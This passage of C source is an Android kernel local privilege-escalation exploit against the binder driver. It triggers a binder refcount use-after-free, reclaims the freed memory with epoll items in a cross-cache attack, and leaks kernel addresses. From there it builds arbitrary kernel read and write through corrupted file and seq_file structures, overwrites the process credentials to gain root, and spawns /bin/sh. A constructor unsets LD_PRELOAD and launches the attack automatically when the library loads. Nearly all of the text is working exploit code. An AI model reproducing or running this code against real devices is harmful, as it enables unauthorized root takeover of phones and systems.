        prctl(PR_SET_NAME, buf, 0, 0, 0);
        LOGD("write");
        lseek(fd, 1, SEEK_SET);
        LOGD("done");
        lseek(fd, 0, SEEK_SET);
        return;
    }

    if (buf[index] == 0) {
        buf[index] = 1;
        comm_fd_set_buffer(fd, buf, index + 1);
        buf[index] = 0;

        prctl(PR_SET_NAME, buf, 0, 0, 0);
        lseek(fd, 1, SEEK_SET);
        lseek(fd, 0, SEEK_SET);
    } else {
        comm_fd_set_buffer(fd, buf, index + 1);
    }
}

void comm_fd_set_val(int fd, u64 val) {
    u8 buf[9] = { 0 };
    u64 *ptr = (u64 *) &buf[0];
    *ptr = val;

    comm_fd_set_buffer(fd, buf, 0);
}

void write_u64(LocalCtx *ctx, usize address, u64 value) {
    comm_fd_set_val(ctx->wr_addr_fd, address);
    comm_fd_set_val(ctx->wr_data_fd, value);
}

void do_a(LocalCtx *ctx) {
    process_a_register(ctx);

    u8 read_buf[4096] = { 0 };
    usize read_amount = 0;

    // first arg must just be nonzero, but does nothing
    int epoll_fd = SYSCHK(epoll_create(1));

    // first we get 28 files open
    int files_to_leak[SPRAY_EPITEM_COUNT] = { 0 };
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i += 2) {
        // must dup file descriptor to allow adding multiple epitem to same struct file
        // badspin uses timerfd for epoll, use this because
        // I get permission denied for regular file and /dev/null
        files_to_leak[i] = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
        files_to_leak[i + 1] = SYSCHK(dup(files_to_leak[i]));
    }

    LOGD("Opened file descriptors...");

    // next step is arrange binder allocator to have many gaps which a received node fit in
    // TODO: figure out why this part is even needed
    // article mentions having it, but I don't really know what the purpose is
    // it seems like allocating transaction buffers from kmalloc-128 while triggering the bug is fine
    // since they will likely end up on different page, since we allocate and deallocate all the nodes + refs all at once
    // However, removing it breaks the cross cache attack
    binder_uintptr_t ref_bufs_to_free[BUFFER_GAP_COUNT] = { 0 };
    for (usize i = 0; i < BUFFER_GAP_COUNT; i++) {
        ref_bufs_to_free[i] = allocate_empty(ctx);
        allocate_empty(ctx);
    }

    LOGD("Allocated from binder allocator...");

    // create the gaps
    for (usize i = 0; i < BUFFER_GAP_COUNT; i++) {
        binder_free_transaction_buffer(ctx->binder.fd, ref_bufs_to_free[i]);
    }

    LOGD("Created gaps in binder allocator...");

    // now spray and uaf many nodes
    // TODO: use async transaction instead of another thread, reduce allocations
    // uaf nodes allocates all the nodes first, then frees them later, so it works how we need
    uaf_nodes(ctx, SPRAY_BASE_ID, SPRAY_NODE_COUNT, true);
    uaf_flush_read(ctx, SPRAY_NODE_COUNT);

    LOGD("UAF nodes done...");

    // reclaim with epoll fds
    struct epoll_event events = {
        // make events not 0 so epoll doesn't ignore
        // idt that is a thing but just in case
        .events = EPOLLIN,
        .data = { 0 },
    };
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i++) {
        SYSCHK(epoll_ctl(epoll_fd, EPOLL_CTL_ADD, files_to_leak[i], &events));
    }

    LOGD("Reclaimed with ep_item...");

    bool epitem_found = false;
    usize epitem_addr = 0;
    usize file_addr = 0;

    for (usize i = 0; i < SPRAY_NODE_COUNT; i++) {
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        struct binder_transaction_data *response = NULL;
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
        if (ret < 0) {
            panic("Didn't receive response");
        }

        if (!epitem_found && response->cookie != SEND_COOKIE && looks_like_kernel_pointer(response->target.ptr) && looks_like_kernel_pointer(response->cookie)) {
            // memory corruption occured, potential epitem leak
            usize leak1 = response->target.ptr;
            usize leak2 = response->cookie;

            // Determine which leak is struct file and which is struct epitem
            // This can be done by looking at alignmant of pointers relative to 128 bytes (epitem size, smaller than struct file)
            // NOTE: struct file is marked with __randomize_layout, but since the layout randomization is done by a GCC kernel module,
            // and android is built with clang, I think it will not be enabled for android

            // struct epitem linked list is at offset 88 and 96
            // so a pointer to ep_item will point to offset 88 (start of struct list_node)
            // on my computer file is 192 size cache, but I think this is incorrect (check filp cache in cat /proc/slabinfo and assume same for android)

            bool leak1_is_epitem = leak1 % 128 == EP_ITEM_LIST_HEAD_OFFSET;
            bool leak2_is_epitem = leak2 % 128 == EP_ITEM_LIST_HEAD_OFFSET;
            if (leak1_is_epitem && leak2_is_epitem) {
                continue;
            } else if (leak1_is_epitem) {
                epitem_addr = leak1 - EP_ITEM_LIST_HEAD_OFFSET;
                file_addr = leak2 - FILE_LIST_HEAD_OFFSET;
            } else if (leak2_is_epitem) {
                epitem_addr = leak2 - EP_ITEM_LIST_HEAD_OFFSET;
                file_addr = leak1 - FILE_LIST_HEAD_OFFSET;
            } else {
                continue;
            }
            if (epitem_addr > 0xffffffe000000000) {
                // sometimes a large address is leaked for some reason
                // and then the corresponding file is unaligned
                // ignore these leaks which are probably some other object
                continue;
            }
            epitem_found = true;
            // still need to read rest of messages, so don't break here
        }
    }

    if (!epitem_found) {
        // TODO: if leak fails, retry cross cache attack
        panic("Could not succeed with cross cache attack");
    }

    LOGD("================ LEAK ================");
    LOGD("Leaked epitem and file");
    LOGD("epitem addr: 0x%lx", epitem_addr);
    LOGD("file addr: 0x%lx", file_addr);

    // find current process
    // u64 node_address = try_mem_unlink(ctx, 0, 0, true);
    // LOGD("node address: 0x%lx", node_address);

    process_a_deregister(ctx);

    // corrupt file->inode to point inside of epitem
    mem_unlink(ctx, file_addr + FILE_INODE_OFFSET, epitem_addr + EP_ITEM_USER_DATA_OFFSET - 40);

    LOGD("A: file->inode corrupted");

    // next determine file descritptor corresponding to struct file and struct epitem we leaked

    // set all arbitrary read to read user data value of leaked struct epitem
    usize update_value = epitem_addr + EP_ITEM_USER_DATA_OFFSET - BLOCK_SIZE_OFFSET;
    events.data.u64 = update_value;
    // events.data.u64 = 0x6969;
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i++) {
        SYSCHK(epoll_ctl(epoll_fd, EPOLL_CTL_MOD, files_to_leak[i], &events));
    }

    u32 ioctl_val = 0;
    usize correct_file_index = -1;
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i += 2) {
        SYSCHK(ioctl(files_to_leak[i], FIGETBSZ, &ioctl_val));
        // check if 4 bytes read match lower 4 bytes of address we set with epoll_ctl_mod
        if (ioctl_val == (u32) (update_value & 0xffffffff)) {
            correct_file_index = i;
            break;
        }
    }

    if (correct_file_index == -1) {
        panic("Could not find file with corrupted inode pointer");
    }

    // now check which of 2 epitems for given file is correct
    // change pointer for first epitem, and check if read value changes
    // if it does, this is correct fd, if it doesn't, second epitem is correct leak
    events.data.u64 = epitem_addr - BLOCK_SIZE_OFFSET;
    SYSCHK(epoll_ctl(epoll_fd, EPOLL_CTL_MOD, files_to_leak[correct_file_index], &events));

    SYSCHK(ioctl(files_to_leak[correct_file_index], FIGETBSZ, &ioctl_val));
    if (ioctl_val == (u32) (update_value & 0xffffffff)) {
        ctx->leak_fd = files_to_leak[correct_file_index + 1];
    } else {
        ctx->leak_fd = files_to_leak[correct_file_index];
    }

    ctx->epoll_fd = epoll_fd;

    LOGD("A: set up arbitrary read");
    u64 file_operations = read_u64(ctx, file_addr + FILE_FOPS_VTABLE_OFFSET);
    LOGD("fops: 0x%lx", file_operations);

    ctx->kernel_base = file_operations - TIMERFD_FOPS_OFFSET;
    LOGD("Leaked kernel base: 0x%lx", ctx->kernel_base);

    find_task_struct_offsets(ctx);

    process_a_register(ctx);
    u64 node_address = try_mem_unlink(ctx, 0, 0, true);
    LOGD("node address: 0x%lx", node_address);

    struct binder_node binder_node = { 0 };
    kread(ctx, node_address, (u8 *) &binder_node, sizeof(binder_node));
    u64 proc_address = (u64) binder_node.proc;
    LOGD("read out binder node");
    LOGD("binder_proc: 0x%lx", proc_address);

    struct binder_proc binder_proc = { 0 };
    kread(ctx, proc_address, (u8 *) &binder_proc, sizeof(binder_proc));
    u64 task_address = (u64) binder_proc.tsk;
    LOGD("read out binder proc");
    LOGD("task_struct: 0x%lx", task_address);

    u8 task_buffer[0x2000] = { 0 };
    kread(ctx, task_address, task_buffer, sizeof(task_buffer));
    u64 cred_address = *(u64 *) &task_buffer[ctx->task_offsets.ts_cred];
    u64 files_address = *(u64 *) &task_buffer[ctx->task_offsets.ts_files];

    LOGD("read out task struct");
    LOGD("creds: 0x%lx", cred_address);
    LOGD("files: 0x%lx", files_address);

    // task address read, node no longer needed
    process_a_deregister(ctx);

    for (usize i = 0; i < 16; i++) {
        LOGD("cred: 0x%lx", read_u64(ctx, cred_address + 8 * i));
    }

    // TODO: figure out if we need to zero securebits
    // for (usize i = 1; i < 5; i++) {
    //     zero_address(ctx, cred_address + 8 * i);
    // }

    int comm_fd1 = SYSCHK(open("/proc/self/comm", O_RDONLY));
    int comm_fd2 = SYSCHK(open("/proc/self/comm", O_RDONLY));

    prctl(PR_SET_NAME, "aaaaaaaa", 0, 0, 0);
    lseek(comm_fd1, 1, SEEK_SET);
    lseek(comm_fd1, 0, SEEK_SET);
    lseek(comm_fd2, 1, SEEK_SET);
    lseek(comm_fd2, 0, SEEK_SET);

    u64 fd_table = read_u64(ctx, files_address + ctx->task_offsets.fs_fdt);
    // first field is length of fdtable array
    u32 fd_count = read_u32(ctx, fd_table);
    // second field is pointer to array of fds
    u64 fd_array = read_u64(ctx, fd_table + 8);

    if (comm_fd1 >= fd_count || comm_fd2 >= fd_count) {
        panic("Invalid fd_count");
    }

    u64 fd_addr1 = read_u64(ctx, fd_array + 8 * comm_fd1);
    u64 fd_addr2 = read_u64(ctx, fd_array + 8 * comm_fd2);

    LOGD("fd_addr1: 0x%lx", fd_addr1);
    LOGD("fd_addr2: 0x%lx", fd_addr2);

    u64 seq_file1 = read_u64(ctx, fd_addr1 + FILE_PRIVATE_DATA_OFFSET);
    u64 seq_file2 = read_u64(ctx, fd_addr2 + FILE_PRIVATE_DATA_OFFSET);

    LOGD("seq_file1: 0x%lx", seq_file1);
    LOGD("seq_file2: 0x%lx", seq_file2);

    // for (usize i = 0; i < 20; i++) {
    //     LOGD("seq file 1: 0x%lx", read_u64(ctx, seq_file1 + 8 * i));
    // }

    // for (usize i = 0; i < 20; i++) {
    //     LOGD("seq file 2: 0x%lx", read_u64(ctx, seq_file2 + 8 * i));
    // }

    // make seq_file1->buf point to seq_file2->buf
    // buf is first field of seq_file
    mem_unlink(ctx, seq_file2, seq_file1 - 8);

    ctx->wr_addr_fd = comm_fd1;
    ctx->wr_data_fd = comm_fd2;

    LOGD("Arbitrary write set up");

    for (usize i = 0; i < 20; i++) {
        LOGD("seq file 1: 0x%lx", read_u64(ctx, seq_file1 + 8 * i));
    }

    for (usize i = 0; i < 20; i++) {
        LOGD("seq file 2: 0x%lx", read_u64(ctx, seq_file2 + 8 * i));
    }

    for (usize i = 1; i < 5; i++) {
        write_u64(ctx, cred_address + 8 * i, 0);
    }

    for (usize i = 0; i < 16; i++) {
        LOGD("cred: 0x%lx", read_u64(ctx, cred_address + 8 * i));
    }

    execlp("/bin/sh", "/bin/sh", NULL);

    for (;;) {}
}

void process_a_register(LocalCtx *ctx) {
    static usize handle_iteration = 0;

    binder_client_init(&ctx->binder, NULL);

    LOG("Binder context created");

    u32 token_manager_handle = -1;
    int ret = find_token_manager(ctx->binder.fd, &token_manager_handle);
    if (ret < 0) {
        LOG("Failed to find token manager");
        return;
    }

    LOGD("Token manager found");

    ret = token_manager_register(
        ctx->binder.fd,
        token_manager_handle,
        PROCESS_A_BINDER + handle_iteration,
        0,
        &ctx->ctx->a_token
    );
    if (ret < 0) {
        LOG("Failed to register binder node with token manager");
        return;
    }

    LOGD("Binder node registered in token manager");

    binder_enter_looper(ctx->binder.fd);

    connect_process_c(ctx);
    connect_process_d(ctx);
}

void process_a_deregister(LocalCtx *ctx) {
    binder_client_destroy(&ctx->binder);
    //ctx->ctx->a_token = { 0 };
}

void process_a(ExploitCtx *ctx) {
    pin_to_cpu(0);

    LocalCtx local_ctx = { 0 };
    local_ctx.ctx = ctx;

    do_a(&local_ctx);
}

void uaf_nodes(LocalCtx *ctx, binder_uintptr_t base_id, u64 node_count, bool use_async) {
    PipeCommand command = { 0 };
    command.header.command_type = UAF_NODE;
    command.header.body_size = sizeof(UafNodeArgs);

    UafNodeArgs *args = calloc(1, sizeof(UafNodeArgs));
    args->base_id = base_id;
    args->node_count = node_count;
    args->use_async = use_async;
    command.data = args;

    send_pipe_command(&ctx->ctx->b_pipe, &command);
    pipe_command_drop(command);

    u32 b_handle = recv_strong_handle(&ctx->binder, -1);

    send_multiple_nodes(&ctx->binder, b_handle, base_id, node_count);

    await_response(&ctx->ctx->b_pipe);

    LOGD("A: got uaf on nodes");
}

// reads out workqueue items which are still in place for uaf nodes
void uaf_flush_read(LocalCtx *ctx, u64 node_count) {
    u8 read_buf[128] = { 0 };
    usize read_amount = 0;

    u64 increfs_count = 0;
    u64 acquire_count = 0;
    u64 tr_complete_count = 0;

    while (tr_complete_count < 1) {
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);

        // cont all 3 seperately
        // it seems it is possible for orders to change, and we need to consume all of them
        acquire_count += binder_read_buffer_count(read_buf, read_amount, BR_ACQUIRE);
        increfs_count += binder_read_buffer_count(read_buf, read_amount, BR_INCREFS);
        tr_complete_count += binder_read_buffer_count(read_buf, read_amount, BR_TRANSACTION_COMPLETE);

        binder_read_buffer_dump(read_buf, read_amount);
    }
}

typedef struct {
    binder_client_t binder;
    u32 a_handle;
    bool active;
} BContext;

void bcontext_deactivate(BContext *bctx) {
    binder_client_destroy(&bctx->binder);
    bctx->active = false;
}

// sets up a connection with a
void acquire_a_handle(ExploitCtx *ctx, BContext *bctx) {
    if (bctx->active) {
        bcontext_deactivate(bctx);
    }

    binder_client_init(&bctx->binder, NULL);
    bctx->active = true;

    u32 token_manager_handle = 0;
    int ret = find_token_manager(bctx->binder.fd, &token_manager_handle);
    if (ret < 0) {
        panic("Failed to create binder client");
    }

    ret = token_manager_lookup(
        bctx->binder.fd,
        token_manager_handle,
        &ctx->a_token,
        &bctx->a_handle
    );
    if (ret < 0) {
        panic("Failed to lookup a binder context");
    }

    binder_enter_looper(bctx->binder.fd);

    // send a node for this process to a
    send_node(&bctx->binder, bctx->a_handle, PROCESS_B_BINDER, true);
}

// process b receives commands from a and does actions
void process_b(ExploitCtx *ctx) {
    pin_to_cpu(0);

    BContext bctx = { 0 };
    bctx.active = false;

    for (;;) {
        PipeCommandResponse response = COMMAND_ERROR;

        LOGD("B: listening for next command...");
        PipeCommand command = recv_pipe_command(&ctx->b_pipe);

        switch (command.header.command_type) {
            case UAF_NODE: {
                UafNodeArgs *args = (UafNodeArgs *) command.data;
                LOGD("B: got UAF command base id: %llu, count: %lu", args->base_id, args->node_count);

                u32 *refs = calloc(args->node_count, sizeof(u32));
                acquire_a_handle(ctx, &bctx);

                LOGD("B: acquired A handle");

                recv_multiple_nodes(&bctx.binder, refs, args->node_count);

                // TODO: maybe don't receive refs 1 by one, but idt it will mess up exploit
                // for (usize i = 0; i < args->node_count; i++) {
                //     refs[i] = recv_strong_handle(&bctx.binder, bctx.a_handle);
                //     LOGD("B: got ref %u", refs[i]);
                // }

                LOGD("B: received handles");

                u8 read_buf[256] = { 0 };
                usize read_amount = 0;

                // send empty message to each node
                for (usize i = 0; i < args->node_count; i++) {
                    if (args->use_async) {
                        struct binder_txn *message = binder_txn_create(refs[i], 0, TF_ONE_WAY);
                        binder_txn_dispatch(message, bctx.binder.fd, false, NULL, 0, NULL);

                        binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                    } else {
                        struct binder_txn *message = binder_txn_create(refs[i], 0, 0);
                        sync_txn_dispatch(bctx.binder.fd, message);

                        binder_txn_destroy(message);
                    }
                }

                LOGD("B: sent fake messages");

                // send vulnerable message to each node
                for (usize i = 0; i < args->node_count; i++) {
                    for (usize j = 0; j < 1; j++) {
                        struct binder_txn *vuln_message = binder_txn_create(refs[i], 0, TF_ONE_WAY);

                        binder_txn_add_binder_object(vuln_message, args->base_id + i, 0);
                        // padding object to make sure buffer doesn't have issue with double decrament
                        binder_txn_add_binder_object(vuln_message, -1, 0);
                        // make offsets unaligned
                        vuln_message->offsets_size -= 1;

                        binder_txn_dispatch(vuln_message, bctx.binder.fd, false, NULL, 0, NULL);
                        binder_txn_destroy(vuln_message);

                        // read error code
                        // allows more errors to be setn in future
                        binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                    }
                }

                LOGD("B: triggered invalid refcount decrament");

                // Idt this is necessary, do cause there were some issues before
                // for (usize i = 0; i < args->node_count; i++) {
                //     binder_decrefs(bctx.binder.fd, refs[i]);
                //     binder_release(bctx.binder.fd, refs[i]);
                // }

                // LOGD("B: released refcount on handles");

                // u8 read_buf[4096] = { 0 };
                // usize read_amount = 0;
                // binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                // LOGD("B: read amount: %lu", read_amount);
                // binder_read_buffer_dump(read_buf, read_amount);

                // ioctl(bctx.binder.fd, BINDER_THREAD_EXIT);
                bcontext_deactivate(&bctx);
                free(refs);

                LOGD("B: closed binder context");

                response = COMMAND_OK;
            } break;
            default: {
                LOG("B: Invalid command recieved");
            }
        }

        pipe_command_drop(command);
        send_command_response(&ctx->b_pipe, response);
    }
}

// process C does nothing but exist as a process that process A can send binder nodes to
// we need a recepient process of a ref when allocating binder node
// and process B closes its binder context frequently so another process is needed
void holder_process(ExploitCtx *ctx, CommandPipe *pipe) {
    pin_to_cpu(0);

    BContext bctx = { 0 };
    bctx.active = false;

    u8 read_buf[256] = { 0 };
    usize read_amount = 0;
    binder_uintptr_t node_counter = 0;

    for (;;) {
        PipeCommandResponse response = COMMAND_ERROR;

        // LOGD("C: listening for next command...");
        PipeCommand command = recv_pipe_command(pipe);

        switch (command.header.command_type) {
            case RECV_NODE: {
                LOGD("C: receiving node...");
                if (bctx.active) {
                    // TODO: figure out if receiving transaction and acknowledging it
                    // or just ignroing it is better (less allocations?)
                    recv_strong_handle(&bctx.binder, bctx.a_handle);
                    response = COMMAND_OK;
                }
            } break;
            case RESET_CONTEXT: {
                bcontext_deactivate(&bctx);
                LOGD("C: deactivated context");
                response = COMMAND_OK;
            } break;
            case ACQUIRE_CONTEXT: {
                acquire_a_handle(ctx, &bctx);
                LOGD("C: reacquired context");
                response = COMMAND_OK;
            } break;
            case SEND_NODE: {
                // can't use send node, cause send node uses async,
                // and async needs to free the buffer before receiving transactions
                if (bctx.active) {
                    struct binder_txn *txn = binder_txn_create(bctx.a_handle, 0, 0);
                    binder_txn_add_binder_object(txn, node_counter, 0x69);
                    node_counter += 1;
                    binder_txn_dispatch(txn, bctx.binder.fd, false, NULL, 0, NULL);
                    binder_txn_destroy(txn);

                    // read response
                    binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);

                    response = COMMAND_OK;
                }
            } break;
            case SEND_EMPTY: {
                if (bctx.active) {
                    struct binder_txn *txn = binder_txn_create(bctx.a_handle, 0, 0);
                    binder_txn_dispatch(txn, bctx.binder.fd, false, NULL, 0, NULL);
                    binder_txn_destroy(txn);

                    // read response
                    binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);

                    response = COMMAND_OK;
                }
            } break;
            default: {
                LOG("C: Invalid command recieved");
            }
        }

        pipe_command_drop(command);
        send_command_response(pipe, response);
    }
}

void process_c(ExploitCtx *ctx) {
    holder_process(ctx, &ctx->c_pipe);
}

void process_d(ExploitCtx *ctx) {
    holder_process(ctx, &ctx->d_pipe);
}

void exploit() {
    // exploit context should be in shared memory
    ExploitCtx *ctx = SYSCHK(mmap(NULL, sizeof(ExploitCtx), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0));;

    exploit_ctx_init(ctx);

    if (SYSCHK(fork()) == 0) {
        // process A instructs process b to do vuln, then performs rest of exploit
        process_a(ctx);
    } else if (SYSCHK(fork()) == 0) {
        // process B executes vuln to get UAF values in process A
        process_b(ctx);
    } else if (SYSCHK(fork()) == 0) {
        process_c(ctx);
    } else {
        process_d(ctx);
    }
}

static void init() __attribute__((constructor));
void init() {
    unsetenv("LD_PRELOAD");
    puts("Starting exploit...");
    exploit();
}